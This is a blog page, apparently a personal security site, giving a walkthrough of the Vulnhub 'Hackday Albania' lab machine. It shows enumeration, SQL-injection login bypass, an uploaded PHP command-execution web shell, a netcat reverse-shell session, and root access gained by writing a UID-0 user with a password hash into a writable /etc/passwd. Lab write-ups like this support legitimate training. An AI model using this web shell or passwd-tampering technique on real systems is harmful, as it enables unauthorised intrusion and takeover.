@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="Let us discuss your security">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="One Plus &lt;weirdless.info@gmail.com&gt;">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Vulnhub: Hackday Albania"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="Let us discuss your security" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="One Plus - X"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>Vulnhub: Hackday Albania - One Plus - X</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+ <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-81899858-1"></script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-81899858-1', 'auto');
+  ga('send', 'pageview');
+		
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-81899858-1');
+</script>
+
+    <!-- Google Adsense -->
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-2313105504330449",
+    enable_page_level_ads: true
+  });
+</script>
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/cheatsheet">
+                    Cheatsheets
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    Contact
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/cheatsheet">
+                    Gallery
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/catch">
+                    Catch ME
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/OSINTToolkit">
+                    OSINTToolkit
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-code" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/11/24/Vulnhub-Hackday-Albania/">
+                Vulnhub: Hackday Albania
+            </a>
+        </h1>
+        <div class="post-info">
+
+
+            
+                <span class="author">Author: <a href="https://twitter.com/One_PlusX" target="_blank">Tanoy Bose</a></span> <br>
+            
+
+
+            
+                <span class="date">2016-11-24</span>
+            
+            <a href="#disqus_thread" class="comments">Comments</a>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>A new night, and a new virtual image to break. Hah! Sound fun.</p>
+<p>We begin Hackday Albania, the usual way, by setting up Virtual box, on host-only mode.</p>
+<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>We launch our nmap with the following command<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ nmap -A 192.168.56.101</div></pre></td></tr></table></figure></p>
+<a id="more"></a> 
+<p>Ofcourse, we now get the open ports available here.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</div><div class="line">Host is up, received arp-response (0.00032s latency).</div><div class="line">Scanned at 2016-11-20 00:19:00 EST <span class="keyword">for</span> 8s</div><div class="line">Not shown: 998 closed ports</div><div class="line">Reason: 998 resets</div><div class="line">PORT     STATE SERVICE REASON         VERSION</div><div class="line">22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</div><div class="line">| ssh-hostkey: </div><div class="line">|   2048 39:76:a2:f0:82:5f:1f:75:0d:e4:c4:c5:a7:48:b1:58 (RSA)</div><div class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYm2x67Jj76wxF+iPVxNiOHoPWukWz7tqhCrzIjI/NPRSOAaBQAv8eNaWt3d5sWHwH0Gaec2rmxAPq60oqpfjXtRrIVixtA6T8kAXd6iuVyzJvXQ9Fat0vcG8elVU54s/eAnA3il7oYj5AC+is1+dyVfol2BE9bpE1k4W6LS1UGTBzgyed/jQunvUtO0SLdwUqBA8uFE7cYqD1hca6GX1nUBT5KkA1IlLygvdpBKOsP++0cH57/4jBT6NSoWt5HHgEzkvfiKNQqXHxhlYeneNxOn6kIYGbZS0LVEJYa0dFSYvjA/gKwaWlBRxjAwG7+L9qKiMIxUjseZ84XG<span class="built_in">cd</span>MLVR</div><div class="line">|   256 21:fe:63:45:2c:cb:a1:f1:b6:ba:36:dd:ed:d3:d9:48 (ECDSA)</div><div class="line">|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLS9vX2eL3WWhdkq642JEUKJ0YUhl7j8TfZDrcNblmHMfAOdlilyCam4ZvH+xdACaCK0rpkBabayCC/MEDbscNI=</div><div class="line">8008/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))</div><div class="line">| http-methods: </div><div class="line">|_  Supported Methods: GET HEAD POST OPTIONS</div><div class="line">| http-robots.txt: 26 disallowed entries </div><div class="line">| /rkfpuzrahngvat/ /slgqvasbiohwbu/ /tmhrwbtcjpixcv/ </div><div class="line">| /vojtydvelrkzex/ /wpkuzewfmslafy/ /xqlvafxgntmbgz/ /yrmwbgyhouncha/ </div><div class="line">| /zsnxchzipvodib/ /atoydiajqwpejc/ /bupzejbkrxqfkd/ /cvqafkclsyrgle/ </div><div class="line">| /unisxcudkqjydw/ /dwrbgldmtzshmf/ /exschmenuating/ /fytdinfovbujoh/ </div><div class="line">| /gzuejogpwcvkpi/ /havfkphqxdwlqj/ /ibwglqiryexmrk/ /jcxhmrjszfynsl/ </div><div class="line">| /kdyinsktagzotm/ /lezjotlubhapun/ /mfakpumvcibqvo/ /ngblqvnwdjcrwp/ </div><div class="line">|_/ohcmrwoxekdsxq/ /pidnsxpyfletyr/ /qjeotyqzgmfuzs/</div><div class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</div><div class="line">|_http-title: HackDay Albania 2016</div></pre></td></tr></table></figure>
+<p>Dang! So we gotta pwn all these paths? Ok, so let us start the pwnage.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ curl 192.168.56.101:8008/robots.txt | cut <span class="_">-d</span> <span class="string">"/"</span> <span class="_">-f</span>2 &gt; paths_available</div><div class="line">oneplus@root$ <span class="built_in">echo</span> <span class="string">""</span>&gt;out_file</div><div class="line">oneplus@root$ <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> wget 192.168.56.101:8008/<span class="variable">$line</span>; <span class="keyword">done</span> &lt; paths_available</div><div class="line">oneplus@root$ <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$line</span>; cat <span class="variable">$line</span>; <span class="built_in">echo</span> <span class="string">"--------------------------------------------------"</span>; <span class="keyword">done</span> &lt; paths_available &gt;&gt; out_file</div><div class="line">oneplus@root$ <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> rm <span class="variable">$line</span>; <span class="keyword">done</span> &lt; paths_available</div><div class="line">oneplus@root$ rm paths_available</div></pre></td></tr></table></figure>
+<p>Now just checking the out_file, we can see<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;/html&gt;--------------------------------------------------</div><div class="line">unisxcudkqjydw</div><div class="line">IS there any /vulnbank/ <span class="keyword">in</span> there ???</div><div class="line">--------------------------------------------------</div></pre></td></tr></table></figure></p>
+<img src="/2016/11/24/Vulnhub-Hackday-Albania/vulnbank.png" alt="Vulnerable Bank" title="Vulnerable Bank">
+<p>And hence we traverse to the link (just follow the directories) - <a href="http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client" target="_blank" rel="external">http://192.168.56.101:8008/unisxcudkqjydw/vulnbank/client</a><br><img src="/2016/11/24/Vulnhub-Hackday-Albania/login.png" alt="Vulnerable Bank" title="Vulnerable Bank"></p>
+<h3 id="Exploitation-Stage-1-Access-Compromise"><a href="#Exploitation-Stage-1-Access-Compromise" class="headerlink" title="Exploitation Stage 1 - Access Compromise"></a>Exploitation Stage 1 - Access Compromise</h3><p>Good god, a Login page? Looking around, and not trying to brutefore, we realize it would be SQL injection vulnerable.<br><img src="/2016/11/24/Vulnhub-Hackday-Albania/sql_error.png" alt="SQL Error occurs" title="SQL Error occurs"></p>
+<p>On investigating further and thanks to the <a href="https://www.exploit-db.com/papers/18263/" target="_blank" rel="external">article on exploit db on False SQL injection</a> that I had read a couple of years earlier, I was able to bypass the authentication.<br><img src="/2016/11/24/Vulnhub-Hackday-Albania/false_injection_payload.png" alt="False Injection" title="False Injection"></p>
+<h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned!"></a>Pwned!</h4><img src="/2016/11/24/Vulnhub-Hackday-Albania/successful_login.png" alt="Successful Login" title="Successful Login">
+<h3 id="Exploitation-Stage-2-Uploading-a-reverse-shell"><a href="#Exploitation-Stage-2-Uploading-a-reverse-shell" class="headerlink" title="Exploitation Stage 2 - Uploading a reverse shell"></a>Exploitation Stage 2 - Uploading a reverse shell</h3><p>Here ofcourse, we see contact support field with file upload option available. We immidiately attempt to upload a shell.</p>
+<p>Here, we 1st go for a small shell of ours<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"><span class="keyword">if</span>(isset(<span class="variable">$_REQUEST</span>[<span class="string">'cmd'</span>]))&#123;  </div><div class="line">  <span class="variable">$cmd</span> = (<span class="variable">$_REQUEST</span>[<span class="string">"cmd"</span>]);  </div><div class="line">  system(<span class="variable">$cmd</span>);  </div><div class="line">  <span class="built_in">echo</span> <span class="string">"&lt;/pre&gt;<span class="variable">$cmd</span>&lt;pre&gt;"</span>;  </div><div class="line">  die;&#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<img src="/2016/11/24/Vulnhub-Hackday-Albania/test_shell.png" alt="Basic PHP shell" title="Basic PHP shell">
+<p>This obviously gives us a non-interactive and a pain in the ass command shell. Hence we quickly switch to <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="external">Pentest Monkey’s php-reverse-shell</a>.<br>Executing this shell, we get a non-interactive sh prompt.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">oneplus@root$ nc -nlvp 1234</div><div class="line">listening on [any] 1234 ...</div><div class="line">connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 51250</div><div class="line">Linux hackday 4.4.0-45-generic <span class="comment">#66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></div><div class="line"> 07:29:34 up 41 min,  0 users,  load average: 0.00, 0.00, 0.00</div><div class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</div><div class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div><div class="line">/bin/sh: 0: can<span class="string">'t access tty; job control turned off</span></div><div class="line">$ whoami</div><div class="line">www-data</div></pre></td></tr></table></figure></p>
+<p>To convert this shell to an interactive one, I generally use a python one-liner, but unfortunately it didn’t run at the 1st go. Hence we enumerate and realise that this machine has python3 instead of python.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ python3 -c <span class="string">'import pty; pty.spawn("/bin/sh")'</span></div></pre></td></tr></table></figure></p>
+<p>Post exploitation was a little time consuming though. I attempted Dirty COW exploit and failed. I tried to exploit the mysql service (whose password we can get from config.php in the /var/www/html/unisxcudkqjydw/vulnbank/client/ folder) and failed again.<br>Now whatever was left to do was <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="external">g0tm1lk’s Basic Linux Priviledge Escalation</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ find / -type f -perm -o=w 2&gt;/dev/null</div></pre></td></tr></table></figure></p>
+<p>Fun, fun, fun. A writeable /etc/passwd.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ cat /etc/passwd</div></pre></td></tr></table></figure></p>
+<p>I added a new user on my own system and set a password for the system. (ThisIsSimplePassword@1234)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">test</span>:<span class="variable">$6</span>$.LkwCuzM<span class="variable">$RGGbHv6CU61Yzk9baltbcgiA08I60BNEvIk2i0Q744alWYj0lFN5AKGll45CwmoRsxPYsjCmNRv3s1ajsjo8Q</span>/:17127:0:99999:7:::</div></pre></td></tr></table></figure></p>
+<p>I downloaded the /etc/passwd file from the server and added the same line above with a little modification at the end.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</div><div class="line">sync:x:4:65534:sync:/bin:/bin/sync</div><div class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</div><div class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</div><div class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</div><div class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</div><div class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</div><div class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</div><div class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</div><div class="line">www-data:<span class="variable">$6</span>$.LkwCuzM<span class="variable">$RGGbHv6CU61Yzk9baltbcgiA08I60BNEvIk2i0Q744alWYj0lFN5AKGll45CwmoRsxPYsjCmNRv3s1ajsjo8Q</span>/:33:33:www-data:/var/www:/usr/sbin/nologin</div><div class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</div><div class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</div><div class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</div><div class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</div><div class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</div><div class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></div><div class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></div><div class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></div><div class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></div><div class="line">syslog:x:104:108::/home/syslog:/bin/<span class="literal">false</span> _apt:x:105:65534::/nonexistent:/bin/<span class="literal">false</span> lxd:x:106:65534::/var/lib/lxd/:/bin/<span class="literal">false</span> mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></div><div class="line">messagebus:x:108:112::/var/run/dbus:/bin/<span class="literal">false</span></div><div class="line">uuidd:x:109:113::/run/uuidd:/bin/<span class="literal">false</span></div><div class="line">dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/<span class="literal">false</span></div><div class="line">sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin</div><div class="line">taviso:x:1000:1000:Taviso,,,:/home/taviso:/bin/bash</div><div class="line"><span class="built_in">test</span>:<span class="variable">$6</span>$.LkwCuzM<span class="variable">$RGGbHv6CU61Yzk9baltbcgiA08I60BNEvIk2i0Q744alWYj0lFN5AKGll45CwmoRsxPYsjCmNRv3s1ajsjo8Q</span>/:0:0:tester:/root:/bin/bash</div></pre></td></tr></table></figure></p>
+<p>I edited the /etc/passwd file on my system, re-uploaded on the server and replaced the origical /etc/passwd file. I used this method because I was having a lot of trouble editing the original /etc/passwd file using any editor.<br>Now we pwn the flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ su <span class="built_in">test</span></div><div class="line">Password: ThisIsSimplePassword@1234</div><div class="line">root@hackday:/home<span class="comment"># cd /root/</span></div><div class="line">root@hackday:~<span class="comment"># cat flag.txt</span></div></pre></td></tr></table></figure></p>
+<blockquote><p>Urime,<br>Tani nis raportin! </p>
+<p>d5ed38fdbf28bc4e58be142cf5a17cf5</p>
+</blockquote>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/Vulnhub/">#Vulnhub</a> <a href="/tags/Hackday/">#Hackday</a> <a href="/tags/Albania/">#Albania</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+    <div class="comments">
+        
+<div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+
+
+    </div>
+    
+
+</div>
+
+        </section>
+
+    </div>
+</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2><a href="https://oneplus-x.github.io/about">About</a></h2>
+                <p>
+                    "I Just don't know what i am doing with?"
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2017/06/11/Enterprise-Offense-IT-Operations-Part-1/">Enterprise Offense: IT Op</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/03/12/Vulnhub-Pluck/">Vulnhub: Pluck 1</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/02/25/kioptrix-1/">Vulnhub - OSCP Series - K</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2017/02/25/ISP-Hacking/">All your creds are belong</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://oneplus.github.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/One_PlusX?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/One Plus - X/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+
+                    
+                    <li class="list-inline-item">
+                        <a href="https://medium.com/@oneplus">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-medium"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+
+                    
+                    <li class="list-inline-item">
+                        <a href="https://oneplus.herokuapp.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-slack"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+
+                    
+                    <li class="list-inline-item">
+                        <a href="https://t.me/oneplus">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-telegram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:weirdless@yandex.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="/atom.xml">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    If your actions inspire others to dream more, learn more, do more and become more, you are a leader.
+                </div>
+            </div>
+        </div>
+    </div>
+<!-- Start of SimpleHitCounter Code -->
+<div align="center">A simple hit counter only for my reference: <a href="https://oneplus.github.io" target="_blank"><img src="http://simplehitcounter.com/hit.php?uid=2280563&f=16777215&b=0" border="0" height="18" width="83" alt="web counter"></a></div>
+<!-- End of SimpleHitCounter Code -->
+
+</footer>
+
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'oneplus';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+</body>
+
+</html>
